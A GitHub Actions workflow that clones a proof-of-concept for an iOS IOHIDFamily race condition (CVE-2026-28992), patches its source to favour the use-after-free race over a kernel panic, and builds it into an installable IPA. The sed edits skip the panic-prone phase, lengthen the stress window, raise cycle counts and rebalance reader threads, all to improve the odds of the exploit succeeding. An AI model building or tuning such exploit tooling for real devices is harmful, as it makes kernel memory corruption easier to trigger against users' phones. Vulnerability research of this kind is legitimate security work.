name: Build UAFPoc Test IPA

on: [workflow_dispatch]

jobs:
  build:
    runs-on: macos-15
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - name: Clone zeroxjf UAFPoc (proper iOS app)
        run: git clone --depth=1 https://github.com/zeroxjf/CVE-2026-28992-IOHIDFamily-FastPathUserClient-Race-Conditions.git base

      - name: Patch SDK compatibility + favor UAF over AOP Panic
        run: |
          sed -i '' 's/#import <mach\/mach.h>/#import <mach\/mach.h>\ntypedef unsigned int ipc_info_object_type_t;/' base/UAFPoc/UAFPoc/ViewController.m
          sed -i '' 's/\bobjectType\b/objectAddr/g' base/UAFPoc/UAFPoc/ViewController.m 2>/dev/null || true
          # SKIP Termination Race phase (causes AOP Panic) to favor UAF race
          sed -i '' 's/if (raceService != MACH_PORT_NULL) {/if (0) {/' base/UAFPoc/UAFPoc/ViewController.m
          # Increase stress window from 25s to 40s for deeper UAF race coverage
          sed -i '' 's/kStressDuration = 25\.0/kStressDuration = 40.0/' base/UAFPoc/UAFPoc/ViewController.m
          sed -i '' 's/kLifecycleCycles = 2000/kLifecycleCycles = 8000/' base/UAFPoc/UAFPoc/ViewController.m
          # 75% readers, 25% churn for optimal race coverage
          sed -i '' 's/readerEnd = (connCount > 4) ? (1 + (connCount - 1) \/ 2) : MIN(connCount, 2)/readerEnd = (connCount > 4) ? (1 + (connCount - 1) * 3 \/ 4) : MIN(connCount, 2)/' base/UAFPoc/UAFPoc/ViewController.m

      - name: Build
        run: |
          cd base/UAFPoc
          xcodebuild -project UAFPoc.xcodeproj -scheme UAFPoc \
            -sdk iphoneos -configuration Release \
            CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO \
            CODE_SIGNING_ALLOWED=NO ONLY_ACTIVE_ARCH=NO \
            -derivedDataPath DerivedData 2>&1 | grep -iE "error:|BUILD FAILED" | head -10
          echo "BUILD_EXIT=$?"

      - name: Package
        run: |
          APP=$(find . -path "*/Release-iphoneos/*.app" -type d | head -1)
          [ -z "$APP" ] && APP=$(find . -path "*/Debug-iphoneos/*.app" -type d | head -1)
          [ -z "$APP" ] && APP=$(find . -name "*.app" -type d | head -1)
          [ -z "$APP" ] && { echo "No .app"; exit 1; }
          rm -rf Payload && mkdir Payload
          cp -R "$APP" Payload/
          codesign -s - -f "Payload/UAFPoc.app" 2>&1
          echo "Sign check OK"
          zip -0 -r UAFPoc_iOS26.ipa Payload/
          ls -lh UAFPoc_iOS26.ipa

      - uses: actions/upload-artifact@v4
        with:
          name: UAFPoc_iOS26
          path: UAFPoc_iOS26.ipa
          retention-days: 7
